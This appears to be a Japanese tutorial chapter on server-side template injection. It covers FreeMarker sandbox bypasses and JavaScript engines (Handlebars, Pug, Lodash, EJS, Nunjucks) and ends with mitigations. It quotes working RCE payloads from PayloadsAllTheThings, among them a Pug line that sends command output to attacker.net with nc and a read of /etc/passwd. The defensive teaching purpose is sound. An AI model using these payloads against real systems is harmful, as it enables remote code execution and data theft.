FreeMarker側は、こうした `Execute` クラスの悪用が繰り返し報告されたことを受け、バージョン2.3.30で**サンドボックス機構**（テンプレートからインスタンス化・呼び出しできるJavaクラスをホワイトリスト方式で制限する仕組み。`TemplateClassResolver` や `object_wrapper` の設定でクラスの新規生成を禁止できる）を強化しました。しかし、CVE-2021-25770は「FreeMarker 2.3.30より前のバージョンに存在する既知のサンドボックス回避手法」として整理されており、JetBrains YouTrack（2020.5.3123より前のバージョン)などの実プロダクトが影響を受けました。

ここで押さえるべき教訓は、**サンドボックスを導入しただけでは、そのサンドボックスの実装漏れ（フェイルオープンな判定条件やクラスパスの見落とし)によって回避され得る**という点です。事実、CVE-2021-25770に対する修正が不完全だったため、後継の脆弱性としてCVE-2022-24442が報告されています(不完全な修正が新たな回避経路を生んだ典型例)。同様の構図はApache OFBizでも繰り返し発生しており、テンプレートエンジンのサンドボックス回避と修正のいたちごっこが、複数年にわたって続いていることが分かります。バージョンに依存する脆弱性であるため、対策時は「FreeMarker本体のバージョンが2.3.30以上か」「サンドボックス設定(`TemplateClassResolver.SAFER_RESOLVER` 等)が有効か」の両方を必ず確認する必要があります。

### 影響（Impact）

この種のSSTIが成立すると、次のような重大な影響が生じます。

- テンプレートエンジンを実行しているプロセスの権限（多くの場合、アプリケーションサーバーのサービスアカウント、時には管理者相当）で任意のOSコマンドを実行できる。
- `cat /etc/passwd` のようなファイル読み取りから、リバースシェルの起動、認証情報や設定ファイルの窃取、さらにはサーバーの完全な侵害（Full Compromise）まで発展し得る。
- 管理者専用機能（メールテンプレート編集など）が入口になっているケースが多く、「管理者権限が必要だから低リスク」と誤解されがちだが、実際には**権限昇格チェーンの最終段**として、または内部関係者・侵害された管理者アカウントを起点に致命傷になり得る。

### 防御策

- **信頼できない入力をテンプレートの構文として解釈させない**ことが根本対策です。テンプレート文字列そのものをユーザーに編集させる設計は避け、変数の値だけを既定のテンプレートに差し込む（テンプレートはコードとして固定し、データだけを可変にする）設計に変更します。
- どうしてもユーザーによるテンプレートカスタマイズが必要な場合は、FreeMarkerの**サンドボックスモード**を使い、`TemplateClassResolver` を `SAFER_RESOLVER` や独自のホワイトリスト実装に設定して、`new()` ビルトインで任意クラスを生成できないよう制限する。
- FreeMarkerを最新版（2.3.30以降、CVE-2021-25770・CVE-2022-24442の修正を含むバージョン)に保守し、サンドボックス関連の修正パッチを追跡する。
- 入力フィルタ・WAFに頼る場合でも、それは**多層防御の一部**として扱い、「`Execute` という文字列を禁止すれば安全」という思い込みは禁物です。本節で見たとおり、`?lower_abc` のような数値-文字変換ビルトインを使えば、危険な識別子は実行時に動的合成できてしまい、静的な文字列一致検査は容易に回避されます。防御は「テンプレートエンジンが到達できるクラス・メソッドの集合を制限する」という実行時のホワイトリスト方式で行うべきです。
- コードレビューでは、テンプレートエンジンの初期化コードにおいて `Configuration` オブジェクトの `setNewBuiltinClassResolver()` や `setObjectWrapper()` が安全な設定になっているかを重点的に確認します。

### まとめ

FreeMarkerのSSTIは、「テンプレート言語がクラスの動的インスタンス化を許す」という設計と、「エンジン自身が同梱するユーティリティクラスの中にOSコマンド実行機能を持つものが存在する」という2つの要因が重なることで、RCEに直結します。攻撃者は `${7*7}` のような無害な式でエンジンの種類と入力の解釈経路を確認した後、`"freemarker.template.utility.Execute"?new()("id")` のようなペイロードでコマンド実行に到達し、フィルタが存在する場合は `?lower_abc` のような数値変換ビルトインで文字列を動的に再構成してブラックリストを回避します。CVE-2021-25770が示すように、サンドボックスという防御機構自体にも実装漏れがあり得るため、バージョン管理・ホワイトリスト方式の制限・テンプレートとデータの分離という多層的な対策が不可欠です。

## JavaScript系SSTIとエンジン別チートシート

Node.jsのサーバーサイドテンプレートエンジン(Handlebars、Pug、EJS、Nunjucks、Lodashなど)は、Java系(Jinja2/FreeMarker/Velocity)ほど「サンドボックス」を強く意識した設計になっていないものが多く、テンプレート内で任意のJavaScript式を評価できてしまうと、そのままNode.jsの標準モジュール(`child_process`など)に到達しやすいという特徴があります。本節では、代表的なJS系テンプレートエンジンのSSTI(Server-Side Template Injection: サーバー側でテンプレートをレンダリングする際に、本来はデータであるべきユーザー入力がテンプレート構文として解釈・評価されてしまう脆弱性)ペイロードと、その裏側にある仕組みを整理します。防御目的の解説であり、実在サービスへの無許可の検証手順は扱いません。

### なぜJS系テンプレートエンジンはRCEに直結しやすいのか

Jinja2やFreeMarkerの多くは、テンプレート内で参照できる名前空間(グローバル変数やビルトイン関数の集合)を意図的に制限し、危険なオブジェクトへ到達するには「クラス階層を遡る」といった迂回が必要です。一方でJS系エンジンの多くは次のような設計上の理由からsink(入力が最終的に実行・解釈される危険な代入先)への距離が近くなります。

- **`eval`やFunctionコンストラクタを内部で使ってテンプレートをコンパイルする実装が多い**。テンプレート文字列を一度JavaScriptのコード片に変換してから`new Function(...)`や`eval`で実行するため、コンパイル前の文字列に細工ができれば任意コードの挿入余地が生まれます。
- **Node.jsのグローバルスコープに`process`オブジェクトが常駐しており、`process.mainModule.require`経由で任意のコアモジュール(`child_process`、`fs`など)をロードできる**。ブラウザのJavaScriptと違い、Node.jsは「OSプロセスを操作するための特権的なAPI」が標準で言語ランタイムに組み込まれているため、テンプレートエンジンのサンドボックスが甘いとほぼ即RCE(Remote Code Execution)に到達します。
- **テンプレートの「式(expression)」構文がJavaScriptの構文をほぼそのまま許容する**エンジン(Lodash、Pugのコード実行構文など)がある。これはテンプレートの表現力を高めるための設計判断ですが、攻撃者から見ればサンドボックス脱出そのものが不要、もしくは非常に浅い迂回で済むことを意味します。

以下、各エンジンの具体的な挙動を見ていきます。

### 汎用(ユニバーサル)ペイロード: `process.mainModule.require`

複数のJS系エンジンで共通して使える、いわば「万能鍵」に相当するのが次のペイロードです。

```javascript
global.process.mainModule.require("child_process").execSync("id").toString()
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ動くのか**: Node.jsではエントリーポイントのモジュールが`process.mainModule`として保持されており、そこには`require`関数が生えています。この`require`はNode.jsのモジュールローダーで、引数に渡した文字列(ここでは`"child_process"`)に対応するコアモジュールをロードして返します。`child_process`モジュールの`execSync`関数はOSのシェルにコマンド文字列をそのまま渡し、同期的に実行して標準出力を返す関数です。つまりこの一行は「Node.jsのグローバル変数からモジュールローダーを取り出し、プロセス生成モジュールを読み込み、そこでシェルコマンドを実行する」という一連の流れを、たった1つのJavaScript式に凝縮したものです。テンプレートエンジンが「任意のJavaScript式を評価してその結果を出力に埋め込む」機能を提供している限り、この式さえテンプレートに注入できればRCEに到達します。

この式は出力の取得方法を変えることで、代表的な4つの検知・悪用パターンに派生します。

```javascript
// Rendered RCE: レンダリング結果に直接コマンド出力が出る場合
global.process.mainModule.require("child_process").execSync("id").toString()

// Error-Based: 出力がそのまま返らない場合、意図的に例外を起こしてエラーメッセージにコマンド出力を混入させる
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]

// Boolean-Based: 真偽値としてしか結果を観測できない場合、コマンドの終了コードを比較して条件分岐を作る
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based: 出力もエラーも観測できないブラインド環境で、応答時間の差から結果を推測する
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜこの4パターンが必要か**: SSTIの検証・(防御側から見れば)影響評価では、アプリケーションがコマンド実行結果をどこまで攻撃者に「見せて」しまうかによって、使える検知手法が変わります。

- **Rendered(直接出力)**: レンダリング結果がそのままHTTPレスポンスに含まれるなら最も単純で、`execSync`の戻り値(`Buffer`)を`.toString()`で文字列化してテンプレートの出力位置に流し込むだけです。
- **Error-Based**: アプリがエラーメッセージ(スタックトレースなど)をレスポンスに含めてしまう場合、わざと例外を発生させ、その例外オブジェクトの中にコマンド出力を埋め込みます。上の例では存在しないパス`"Y:/A:/"+コマンド出力`を`require`に渡すことで「モジュールが見つからない」という`Error`オブジェクトのメッセージ文字列にコマンド出力が連結される、あるいは文字列に対する不正なプロパティアクセス(`""["x"][...]`)でTypeErrorのメッセージにインデックス値(コマンド出力)が現れる、という性質を利用します。
- **Boolean-Based**: レスポンスの内容やステータスコードが「真/偽」の2値でしか観測できないブラインド状況では、`spawnSync`の戻り値`status`(プロセスの終了コード、成功時は`0`)を条件式で判定し、配列の`length`プロパティへのアクセスの成否(存在しない添字だと`undefined`、存在すれば数値)によってテンプレートエンジン側のエラー有無・出力有無を切り替え、真偽の1ビットを外部から観測可能にします。
- **Time-Based**: 出力もエラーも一切観測できない完全なブラインド状況では、`&& sleep 5`をコマンドに連結して応答時間を意図的に遅延させ、レスポンスタイムの差(遅延の有無)だけで条件やコマンド実行の成否を1ビットずつ読み出します。これはSQLi(SQLインジェクション)のタイムベースブラインド手法と同じ発想で、「観測できる唯一のチャネルが時間差だけ」という状況に対応する最後の手段です。

これらのバリエーションは、後述する各エンジン固有のペイロードのテンプレート構文の中に、この`process.mainModule.require(...)`という核となる式を差し込む形で組み合わせて使います。

### Handlebarsの場合: サンドボックスをconstructorチェーンで迂回する

Handlebarsは`{{ }}`構文を使うテンプレートエンジンで、通常はコンテキストオブジェクトのプロパティ参照や登録済みヘルパー呼び出ししかできず、任意のJavaScriptオブジェクトへ自由にアクセスすることはできません。しかし、`GHSA-q42p-pg8m-cqh6`として報告された脆弱性(影響バージョン: `< 3.0.7`、`>= 4.0.0` かつ `< 4.0.14`、`>= 4.1.0` かつ `< 4.1.2`。修正は各系列の後継バージョンで行われています)では、`#with`ブロックヘルパーのネストと文字列オブジェクトの`constructor`プロパティを組み合わせることで、テンプレートのコンテキストから任意のコンストラクタ関数へたどり着けてしまいます。

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**仕組みの分解**: このペイロードは一見難読化されているように見えますが、行っていることは次の3ステップです。

1. **文字列プリミティブから`constructor`(コンストラクタ関数、そのオブジェクトを生み出した「型」を表す関数)を取り出す**。JavaScriptでは文字列リテラルもオブジェクトのようにプロパティアクセスができ、`"s".constructor`は`String`関数そのものを返します。`{{#with "s" as |string|}}`でこの文字列をコンテキストに束縛し、`lookup string.sub "constructor"`(`sub`は文字列のスライスメソッドの一種で、ここでは実質的にオブジェクトとしての文字列を経由するための踏み台)でconstructorへの参照を得ます。
2. **`Function`コンストラクタに到達する**。JavaScriptでは関数オブジェクトの`constructor`は`Function`であり、任意の文字列をJavaScriptコードとしてコンパイルして実行できる`new Function(codeString)`と等価な操作が可能になります。上記の`{{this.push (lookup string.sub "constructor")}}`のような一連の配列push/pop操作は、Handlebars側の式評価の制約(直接`new Function(...)`のような呼び出し構文が書けない)を回避しつつ、配列を経由してこの`constructor`を後段の`apply`呼び出しの対象にするためのテクニックです。
3. **生成した関数に攻撃者のコード文字列を注入して呼び出す**。`this.push "return require('child_process').execSync('ls -la');"`で、実行させたいJavaScriptコード(ここでは`child_process`をrequireしてコマンドを実行し、その戻り値をreturnする関数本体)を配列に積み、`string.sub.apply(0, codelist)`という形で「配列の要素を引数リストとして関数を呼び出す」`Function.prototype.apply`の挙動を使って、事実上`Function("return require('child_process').execSync('ls -la');")()`を実行させます。

このように、Handlebars自体は`eval`のような危険な関数を直接テンプレート内に公開していませんが、**JavaScriptの言語仕様上どのオブジェクトからも辿れる`constructor`チェーン**(文字列→String→Function)を悪用することで、事実上の`eval`相当の能力に到達できてしまいます。これは「サンドボックス」という概念が、個々の危険な関数を隠すだけでは不十分で、言語のプロトタイプチェーン全体を遮断しない限り破られ得ることを示す典型例です。修正版のHandlebarsでは、この種のコンストラクタ経由のプロトタイプチェーン到達を制限する対策が施されています。

### Pugの場合: テンプレート内での生JavaScript実行

Pug(旧Jade)は、行頭に`-`をつけることでテンプレート内に生のJavaScript文をそのまま埋め込める設計になっています。これはHandlebarsのような「制約付きの式評価」ではなく、そもそも言語機能として素のコード実行を許しているため、インジェクションが成立すれば迂回なしで即座にコード実行に至ります。

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

もしくは1行にまとめた式ベースの表現として、次のような形も使われます。

```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ動くのか**: Pugのコンパイラはテンプレートをレンダリング関数(JavaScriptのソースコード)にコンパイルする際、`-`で始まる行を「バッファリングされないコード(unbuffered code)」としてそのままコンパイル後のJavaScriptに埋め込みます。つまりPugにおける`-`行や`#{}`/`=`式は、テンプレート言語の枠内に収まらず、事実上「そのままJavaScriptとして実行される領域」です。ここに攻撃者が制御できる文字列がテンプレートのソースとして渡ってしまう(例えば、ユーザー入力をテンプレート文字列として`pug.render(userInput)`のように直接コンパイルしてしまう実装)と、サンドボックスを迂回する必要すらなく、`root.process`(テンプレートのローカル変数として渡されるグローバルコンテキスト、または`process`グローバルへの参照)経由でNode.jsのAPIに直接手が届きます。`spawnSync`は`execSync`と似ていますが、コマンドと引数配列を分離して渡せるため、シェルのメタ文字解釈を避けつつプロセスを起動できる点が異なります(ただし`shell: true`オプションを渡した場合はシェル経由になり、通常のコマンドインジェクションと同様の注意が必要です)。

### Lodashの場合: テンプレートオプションの設定ミスと`process.binding`

Lodashの`_.template()`は本来「ユーティリティ関数」であり、テンプレートエンジンとして使うことを主目的とはしていませんが、実務では簡易テンプレートとして利用されることがあります。

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜここが危険なsinkになるのか**: `options.evaluate`は「JavaScriptとしてそのまま評価される部分」を示す正規表現です。つまり開発者が`evaluate`オプションの対象範囲(通常は`{{ }}`のような区切り)を自前で設定した時点で、その区切りの中身は`interpolate`(値を安全に出力側へ埋め込む用途)とは異なり、**任意のJavaScript文として実行される**ことが設計上の前提になります。もしこの`evaluate`の対象文字列にユーザー入力がそのまま流れ込む実装になっていれば、`{{ ここに攻撃者の入力 }}`という形でコードインジェクションが成立します。これはテンプレートエンジン自体の脆弱性というより、「評価対象」と「出力対象」を分けるという設計意図を開発者が誤用してしまう、設定起因のSSTIの典型例です。

Command Executionの実例として次のペイロードが挙げられます。

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**仕組み**: このペイロードは`child_process`モジュールを介さず、Node.jsの内部バインディング`process.binding("spawn_sync")`を直接呼び出してプロセスを生成しています。`process.binding`はNode.jsのC++実装(ネイティブアドオン)へ直接アクセスするための低レベルAPIで、`child_process`モジュールはこの内部APIをラップして使いやすくした「表向きの」インターフェースにすぎません。ペイロードは`Object`から新しいオブジェクト`a`(`w`とエイリアス)を生成し、パイプ用のファイルディスクリプタ構成(`type: "pipe"`、`readable`/`writable`フラグ)、実行ファイル(`/bin/sh`)、引数配列、標準入出力の割り当て(`stdio`)を手動で組み立てたうえで、`spawn_sync`バインディングの`spawn()`に渡しています。`require('child_process')`が使えない、あるいは`require`自体がフィルタされている場合でも、`process`グローバルとその`binding`メソッドさえ生きていれば、より低レイヤーのAPIから同じ結果(コマンド実行)に到達できることを示す例です。防御側としては「`require`や`child_process`という文字列だけを禁止する」フィルタが、`process.binding`のような迂回経路に対して無力であることの根拠になります。

### EJS・Nunjucksについての補足

> ⚠️ **未取得の資料**: 今回参照した一次情報(PayloadsAllTheThings JavaScript.md)には、EJSおよびNunjucks固有の独立したペイロードセクションは含まれておらず、冒頭のエンジン一覧表(区切り文字が`EJS: <% %>`、`NunjucksJS: {{ }}`)にとどまり、専用のコード例は取得できませんでした。詳細な最新ペイロードは元ページを直接ご参照ください: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

（以下は未取得資料の補足として一般知識に基づく解説です）EJSは`<% %>`(スクリプトレット、任意文実行)と`<%= %>`(値の出力、HTMLエスケープなし)、`<%- %>`(値の出力、生HTML)という複数の区切りを持ちます。EJSの`<% %>`はPugの`-`行と同様に「テンプレートコンパイル後のJavaScriptにそのまま埋め込まれる生コード領域」であるため、ここにユーザー入力が到達すれば前述の`process.mainModule.require`ペイロードがそのまま使えます。Nunjucksは元々Jinja2の設計思想をJavaScriptに移植したエンジンで、`{{ }}`は式の出力用ですが、Nunjucksは独自のフィルタ機構やグローバル関数を通じてサンドボックスの薄さが問題になることがあり、`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`のように、配列生成関数`range`の`constructor`(=`Function`)を経由してコードを実行させる、Handlebarsと同種の「constructorチェーン」パターンが知られています。いずれのケースも、根底にあるのは前述した「JavaScriptのどのオブジェクトからもプロトタイプチェーンを遡って`Function`コンストラクタに到達できる」という言語仕様レベルの共通問題です。

### エンジン別テンプレート区切り文字チートシート

検知・トリアージの第一歩は、対象がどのテンプレートエンジンかを見分けることです。以下はテンプレート区切り文字の一覧で、レスポンスに`{{7*7}}`等を送って挙動を観察する際の手がかりになります。

| テンプレートエンジン | 区切り文字(delimiter) |
|---|---|
| DotJS | `{{= }}` |
| DustJS | `{ }` |
| EJS | `<% %>` |
| Handlebars | `{{ }}` |
| HoganJS | `{{ }}` |
| Lodash | `{{= }}` |
| MustacheJS | `{{ }}` |
| NunjucksJS | `{{ }}` |
| PugJS | `#{ }` |
| TwigJS(JS移植版) | `{{ }}` |
| UnderscoreJS | `<% %>` |
| VelocityJS | `#=set($X="")$X` |
| VueJS | `{{ }}` |

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ区切り文字の一致だけでは確定診断にならないか**: `{{ }}`という区切り文字はHandlebars、HoganJS、MustacheJS、NunjucksJS、VueJSなど複数のエンジンで共有されているため、区切り文字が一致しても対象エンジンを一意に特定することはできません。実務のトリアージでは、区切り文字による一次スクリーニングの後、各エンジン固有の関数名(`range`があればNunjucks、`#with`ブロックヘルパーが効けばHandlebars、といった具合)や、エラーメッセージに出るスタックトレースの文言(`Handlebars: ...`、`Pug:...`など)、レスポンスヘッダやフレームワークの典型的な組み合わせ(例: Expressアプリで`res.render`を使っていればビューエンジンの設定からある程度絞り込める)を併用して、候補を段階的に絞り込む必要があります。

### 参考: 汎用SSTI検知手法との比較(補足)

Payloadplaygroundのチートシートは、Jinja2/Twig/FreeMarker/ERB/Velocity/Thymeleaf/SpEL/Pebbleといった主にPython・Java・Ruby系のテンプレートエンジンを対象とした検知式・差分テストの一覧を提供しており、今回のJavaScript系エンジンの記載は含まれていませんでした。ただし、そこで採用されている**方法論**(`{{7*7}}`のような数値演算の埋め込みでSSTIかどうかを検知し、`{{7*'7'}}`のような型混在の演算で出力差分(例: Jinja2は文字列反復で`7777777`、Twigは型変換して`49`)からエンジンを絞り込むという段階的差分テスト)は、言語やエンジンを問わず応用できる普遍的な考え方です。JS系エンジンのトリアージでも、まず無害な演算式(`{{7*7}}`相当)でテンプレート評価が起きるかを確認し、次に区切り文字やエラーメッセージの差異でエンジンを絞り込み、最後に該当エンジン固有のペイロードを試す、という同じ3段階のアプローチが有効です。

> 出典: Payloadplayground: SSTI cheatsheet(エンジン別テスト式一覧) — https://payloadplayground.com/cheatsheets/ssti

### 防御側の要点まとめ

- **テンプレート文字列にユーザー入力を直接渡さない**。テンプレートは事前に固定されたファイルとして用意し、ユーザー入力は変数(コンテキストデータ)としてのみ渡す設計にします。`pug.render(userInput)`や`_.template(userInput)`のように、テンプレートの「構造」自体をユーザー入力から組み立てる実装は避けるべきです。
- **信頼できないテンプレート文字列を扱う場合は、サンドボックス化された実行環境(別プロセス、権限を絞ったVMコンテキストなど)を使う**。Node.jsの`vm`モジュールによる分離も万能ではなく、既知のプロトタイプチェーン経由の脱出手法が存在するため、OSレベルのプロセス分離やコンテナ分離と組み合わせるのが望ましい防御です。
- **依存ライブラリのバージョンを追跡する**。Handlebarsの`GHSA-q42p-pg8m-cqh6`のように、テンプレートエンジン自体の脆弱性は修正版がリリースされているため、古いバージョンを使い続けないことが基本的だが重要な対策です。
- **`require`や`child_process`という文字列だけをブロックするフィルタは不十分**。`process.binding`のような低レベルAPI経由の迂回や、`constructor`チェーンを介した間接的な到達経路があるため、文字列ブラックリスト方式のWAF的対策は根本的な解決になりません。入力のサニタイズよりも、そもそもテンプレートの評価対象にユーザー入力を含めない設計上の分離が最も効果的です。


---

### ナビゲーション

- ← 前の章: [第7章 SSTIの基礎と検出・エンジン特定](07-ssti-basics.md)
- 🏠 [目次（ホーム）](index.md)
- → 次の章: [第9章 SSTIツールと実バグバウンティ報告](09-ssti-tools-reports.md)
